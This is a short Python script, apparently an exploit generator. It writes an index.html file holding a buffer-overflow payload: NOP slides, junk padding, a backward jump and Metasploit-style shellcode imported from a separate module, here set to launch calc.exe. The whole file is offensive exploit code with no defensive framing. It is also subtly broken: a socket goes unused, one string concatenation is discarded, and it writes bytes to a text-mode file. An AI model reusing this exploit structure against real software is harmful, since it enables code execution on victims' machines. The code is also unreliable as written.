from time import sleep
from payload import buf
import socket
import struct
def shell_attack(target_machine, target_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    indexva = '<html><head><title>loneferret test</title></head><body>'
    indexva += '<script defer="'
    indexva += '">'
    indexva + '</body></html>'
    indexva = bytes(indexva, 'utf-8')
    buffer = b'\x90' * 243 # nop slide 2
  
  
    buffer += b'\x41' * 6236 # junk
    buffer += b'\x90' * 180 # nop slide 1
    buffer += b'\x43' * 50
    buffer += b'\xE9\x55\xFE\xFF\xFF'# jumps back in nop slide 1
    buffer += indexva
    # win32_exec -
    # EXITFUNC=seh CMD=calc.exe Size=164 Encoder=PexFnstenvSub http://metasploit.com */

    buffer += buf
    file=open('index.html','w')
    file.write(buffer)
    file.close()
